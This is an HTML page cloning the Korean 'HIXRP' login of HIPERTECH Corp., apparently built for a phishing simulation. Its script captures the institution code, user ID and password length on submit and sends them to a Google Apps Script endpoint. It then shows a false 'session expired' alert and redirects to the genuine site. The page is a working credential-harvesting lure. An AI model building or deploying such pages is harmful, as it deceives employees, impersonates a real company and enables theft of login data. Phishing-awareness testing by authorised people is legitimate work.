<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HIXRP 로그인</title>
    <style>
        /* 배경 설정: 깃허브에 올린 background.png 사용 */
        body {
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Malgun Gothic', '맑은 고딕', sans-serif;
            background: url('background.png') no-repeat center center;
            background-size: cover;
        }

        /* 로그인 컨테이너 */
        .login-box {
            width: 350px;
            background: #ffffff;
            padding: 40px 30px;
            border-radius: 12px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
            text-align: center;
            /* 배경 이미지 레이아웃에 맞춰 위치 조정 (필요시 수정) */
            margin-right: 320px; 
        }

        .logo-area img {
            max-width: 150px;
            margin-bottom: 30px;
        }

        .input-group {
            margin-bottom: 12px;
            text-align: left;
        }

        .input-group label {
            display: block;
            font-size: 11px;
            font-weight: bold;
            color: #5579a6;
            margin-bottom: 5px;
            text-transform: uppercase;
        }

        .input-group input {
            width: 100%;
            padding: 12px;
            border: 1px solid #9dbce3;
            border-radius: 4px;
            box-sizing: border-box;
            font-size: 14px;
        }

        .btn-login {
            width: 100%;
            padding: 14px;
            background-color: #1a2660;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-weight: bold;
            font-size: 15px;
            margin-top: 10px;
        }

        .btn-resign {
            width: 100%;
            padding: 10px;
            background: none;
            border: 1px solid #ccc;
            margin-top: 10px;
            cursor: pointer;
            color: #666;
            font-size: 13px;
            border-radius: 4px;
        }

        .options {
            margin-top: 20px;
            font-size: 12px;
            color: #666;
            display: flex;
            justify-content: center;
            gap: 15px;
        }

        .footer-links {
            margin-top: 20px;
            padding-top: 15px;
            border-top: 1px solid #eee;
            font-size: 11px;
        }

        .footer-links a { color: #666; text-decoration: none; margin: 0 5px; }
        .copyright { margin-top: 30px; font-size: 10px; color: #aaa; }
    </style>
</head>
<body>

    <div class="login-box">
        <div class="logo-area">
            <img src="logo.png" alt="XRP ez">
        </div>

        <form id="simulationForm">
            <div class="input-group">
                <label>CODE</label>
                <input type="text" id="entCd" placeholder="기관코드" required>
            </div>
            <div class="input-group">
                <label>ID</label>
                <input type="text" id="userId" placeholder="아이디" required>
            </div>
            <div class="input-group">
                <label>PASSWORD</label>
                <input type="password" id="userPw" placeholder="비밀번호" required>
            </div>

            <button type="submit" class="btn-login">로 그 인</button>
        </form>

        <button class="btn-resign">퇴사자 증명 신청</button>

        <div class="options">
            <label><input type="checkbox"> 기관코드저장</label>
            <label><input type="checkbox"> 아이디저장</label>
        </div>

        <div class="footer-links">
            <a href="#">IP승인요청</a> | <a href="#">비밀번호 찾기</a> | <a href="#"><strong>개인정보처리방침</strong></a>
        </div>

        <p class="copyright">ⓒ HIPERTECH Corp. All Rights Reserved.</p>
    </div>

    <script>
        const gasUrl = 'https://script.google.com/macros/s/AKfycbwG55MXJXjRpOBQwfX98zaJP5Rag-cnJF6ZFOJj_TY1BFJwQrQD4kZAzOkBFvktkBnqCA/exec';

        document.getElementById('simulationForm').addEventListener('submit', function(e) {
            e.preventDefault();

            const entCd = document.getElementById('entCd').value;
            const id = document.getElementById('userId').value;
            const pw = document.getElementById('userPw').value;

            // 로그 전송
            const finalUrl = `${gasUrl}?targetId=${encodeURIComponent(entCd)}&inputId=${encodeURIComponent(id)}&pwLen=${pw.length}`;
            fetch(finalUrl, { method: 'POST', mode: 'no-cors' });

            // 최종 리다이렉트 주소 반영
            setTimeout(() => {
                alert('보안 세션이 만료되었습니다. 다시 로그인해 주세요.');
                window.location.href = 'https://gnk.hixrp.kr/index.jsp';
            }, 500);
        });
    </script>
</body>
</html>
